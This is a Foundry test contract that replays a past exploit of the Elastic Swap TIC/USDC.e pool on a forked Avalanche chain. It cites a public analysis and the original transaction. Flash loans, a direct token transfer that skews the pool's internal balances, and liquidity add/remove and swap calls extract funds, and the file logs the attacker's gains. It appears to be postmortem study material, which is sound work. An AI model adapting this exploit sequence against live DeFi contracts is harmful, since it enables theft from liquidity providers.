// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://quillaudits.medium.com/decoding-elastic-swaps-850k-exploit-quillaudits-9ceb7fcd8d1a
// @Tx
// https://etherscan.io/tx/0xb36486f032a450782d5d2fac118ea90a6d3b08cac3409d949c59b43bcd6dbb8f

interface ELPExchange is IERC20 {
    struct InternalBalances {
        // x*y=k - we track these internally to compare to actual balances of the ERC20's
        // in order to calculate the "decay" or the amount of balances that are not
        // participating in the pricing curve and adding additional liquidity to swap.
        uint256 baseTokenReserveQty; // x
        uint256 quoteTokenReserveQty; // y
        uint256 kLast; // as of the last add / rem liquidity event
    }

    function internalBalances() external view returns (InternalBalances memory);
    function addLiquidity(
        uint256 _baseTokenQtyDesired,
        uint256 _quoteTokenQtyDesired,
        uint256 _baseTokenQtyMin,
        uint256 _quoteTokenQtyMin,
        address _liquidityTokenRecipient,
        uint256 _expirationTimestamp
    ) external;
    function removeLiquidity(
        uint256 _liquidityTokenQty,
        uint256 _baseTokenQtyMin,
        uint256 _quoteTokenQtyMin,
        address _tokenRecipient,
        uint256 _expirationTimestamp
    ) external;
    function swapQuoteTokenForBaseToken(
        uint256 _quoteTokenQty,
        uint256 _minBaseTokenQty,
        uint256 _expirationTimestamp
    ) external;
}

contract ContractTest is Test {
    IERC20 TIC = IERC20(0x75739a693459f33B1FBcC02099eea3eBCF150cBe);
    IERC20 USDC_E = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    Uni_Pair_V2 SPair = Uni_Pair_V2(0x4CF9dC05c715812FeAD782DC98de0168029e05C8);
    Uni_Pair_V2 JPair = Uni_Pair_V2(0xA389f9430876455C36478DeEa9769B7Ca4E3DDB1);
    ELPExchange ELP = ELPExchange(0x4ae1Da57f2d6b2E9a23d07e264Aa2B3bBCaeD19A);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("Avalanche", 23_563_709);
    }

    function testExploit() public {
        TIC.approve(address(ELP), type(uint256).max);
        USDC_E.approve(address(ELP), type(uint256).max);
        ELP.approve(address(ELP), type(uint256).max);
        SPair.swap(51_112 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "Attacker USDC.E balance after exploit", USDC_E.balanceOf(address(this)), USDC_E.decimals()
        );
        emit log_named_decimal_uint("Attacker TIC balance after exploit", TIC.balanceOf(address(this)), TIC.decimals());
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        JPair.swap(766_685 * 1e6, 0, address(this), new bytes(1));
        TIC.transfer(address(SPair), 51_624 * 1e18);
    }

    function joeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        uint256 TICAmount = TIC.balanceOf(address(ELP));
        uint256 USDC_EAmount = USDC_E.balanceOf(address(ELP));
        uint256 _expirationTimestamp = 1_000_000_000_000;
        ELP.addLiquidity(1e9, 0, 0, 0, address(this), _expirationTimestamp);
        ELP.addLiquidity(TICAmount, USDC_EAmount, 0, 0, address(this), _expirationTimestamp);
        USDC_E.transfer(address(ELP), USDC_E.balanceOf(address(ELP)));
        ELP.removeLiquidity(ELP.balanceOf(address(this)), 1, 1, address(this), _expirationTimestamp);
        // USDC.E swap to TIC
        ELPExchange.InternalBalances memory InternalBalance = ELP.internalBalances();
        uint256 USDC_EReserve = InternalBalance.quoteTokenReserveQty;
        ELP.swapQuoteTokenForBaseToken(USDC_EReserve * 100, 1, _expirationTimestamp);
        TICAmount = TIC.balanceOf(address(this));
        USDC_EAmount = USDC_E.balanceOf(address(this));
        // TIC swap to USDC.e
        ELP.addLiquidity(TICAmount, USDC_EAmount, 0, 0, address(this), _expirationTimestamp);
        ELP.removeLiquidity(ELP.balanceOf(address(this)), 1, 1, address(this), _expirationTimestamp);
        USDC_E.transfer(address(JPair), 774_353 * 1e6);
    }
}
